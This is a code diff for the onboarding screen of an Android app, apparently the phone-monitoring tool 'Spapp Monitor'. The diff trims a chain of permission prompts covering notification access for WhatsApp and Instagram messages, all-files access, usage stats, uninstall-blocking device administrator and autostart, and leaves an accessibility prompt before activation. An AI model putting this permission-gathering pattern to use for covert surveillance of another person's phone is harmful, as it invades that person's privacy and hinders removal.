@@ -68,53 +68,11 @@ class ConsentActivity : AppCompatActivity() {
         checkAndPromptNextSystemPermission()
     }
 
-    // 2. Battery Exemption Launcher
-    private val batteryLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) {
-        checkAndPromptNextSystemPermission()
-    }
-
-    // 3. All Files Access Launcher
-    private val allFilesLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) {
-        checkAndPromptNextSystemPermission()
-    }
-
-    // 4. Notification Listener Launcher
-    private val notificationListenerLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) {
-        checkAndPromptNextSystemPermission()
-    }
-
-    // 5. Accessibility Launcher
+    // 2. Accessibility Launcher
     private val accessibilityLauncher = registerForActivityResult(
         ActivityResultContracts.StartActivityForResult()
     ) {
-        checkAndPromptNextSystemPermission()
-    }
-
-    // 6. Usage Stats Launcher
-    private val usageLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) {
-        checkAndPromptNextSystemPermission()
-    }
-
-    // 7. Device Admin Launcher
-    private val deviceAdminLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) {
-        checkAndPromptNextSystemPermission()
-    }
-
-    // 8. Autostart Launcher
-    private val autostartLauncher = registerForActivityResult(
-        ActivityResultContracts.StartActivityForResult()
-    ) {
-        checkAndPromptNextSystemPermission()
+        proceedToActivation()
     }
 
     override fun onCreate(savedInstanceState: Bundle?) {
@@ -134,92 +92,15 @@ class ConsentActivity : AppCompatActivity() {
     }
 
     private fun checkAndPromptNextSystemPermission() {
-        // Step 1: Battery Optimization Exemption
-        if (!isBatteryExempted()) {
-            try {
-                val intent = Intent(Settings.ACTION_REQUEST_IGNORE_BATTERY_OPTIMIZATIONS).apply {
-                    data = Uri.parse("package:$packageName")
-                }
-                batteryLauncher.launch(intent)
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Battery ignore optimizations intent failed", e)
-            }
-        }
-
-        // Step 2: All Files Access (Android 11+)
-        if (!isFileAccessGranted()) {
-            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
-                try {
-                    Toast.makeText(this, "Enable 'Allow access to manage all files', then tap Back", Toast.LENGTH_LONG).show()
-                    val intent = Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply {
-                        data = Uri.parse("package:$packageName")
-                    }
-                    allFilesLauncher.launch(intent)
-                    return
-                } catch (e: Exception) {
-                    Log.w(TAG, "All files intent failed", e)
-                }
-            }
-        }
-
-        // Step 3: Notification Listener (WhatsApp & Instagram messages)
-        if (!isNotificationAccessGranted()) {
-            try {
-                Toast.makeText(this, "Toggle ON Spapp Monitor in Notification Access, then tap Back", Toast.LENGTH_LONG).show()
-                val intent = Intent(Settings.ACTION_NOTIFICATION_LISTENER_SETTINGS)
-                notificationListenerLauncher.launch(intent)
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Notification listener intent failed", e)
-            }
-        }
-
-        // Step 4: Accessibility Service (Screen & Chats)
+        // Standard Runtime Permissions already handled.
+        // Prompt Accessibility Service next:
         if (!isAccessibilityEnabled()) {
             showAccessibilityDialog()
             return
         }
 
-        // Step 5: App Usage Stats
-        if (!isUsageAccessGranted()) {
-            try {
-                Toast.makeText(this, "Enable Usage Access for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
-                val intent = Intent(Settings.ACTION_USAGE_ACCESS_SETTINGS)
-                usageLauncher.launch(intent)
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Usage access intent failed", e)
-            }
-        }
-
-        // Step 6: Device Administrator (Prevents unauthorized uninstall & enables remote lock)
-        if (!isDeviceAdminActive()) {
-            try {
-                Toast.makeText(this, "Activate Device Administrator to prevent unauthorized removal, then tap Back", Toast.LENGTH_LONG).show()
-                deviceAdminLauncher.launch(SpappDeviceAdminReceiver.activationIntent(this))
-                return
-            } catch (e: Exception) {
-                Log.w(TAG, "Device admin intent failed", e)
-            }
-        }
-
-        // Step 7: Autostart (Xiaomi / Vivo / Oppo / Huawei)
-        if (isOemRom() && !autostartPrompted) {
-            autostartPrompted = true
-            val autostartIntent = getAutostartIntent()
-            if (autostartIntent != null) {
-                try {
-                    Toast.makeText(this, "Enable Autostart for Spapp Monitor, then tap Back", Toast.LENGTH_LONG).show()
-                    autostartLauncher.launch(autostartIntent)
-                    return
-                } catch (e: Exception) {
-                    Log.w(TAG, "Autostart intent failed", e)
-                }
-            }
-        }
-
-        // All checks completed -> proceed to activation
+        // Core + Accessibility done -> proceed straight to activation!
+        // Remaining permissions are configured individually on the main screen.
         proceedToActivation()
     }
 
@@ -245,14 +126,14 @@ class ConsentActivity : AppCompatActivity() {
                     accessibilityLauncher.launch(intent)
                 } catch (e: Exception) {
                     Log.e(TAG, "Cannot open accessibility settings", e)
-                    checkAndPromptNextSystemPermission()
+                    proceedToActivation()
                 }
             }
             .setNeutralButton(R.string.open_app_info) { _, _ ->
                 openAppInfoSettings()
             }
             .setNegativeButton("Skip") { _, _ ->
-                checkAndPromptNextSystemPermission()
+                proceedToActivation()
             }
             .setCancelable(false)
             .show()
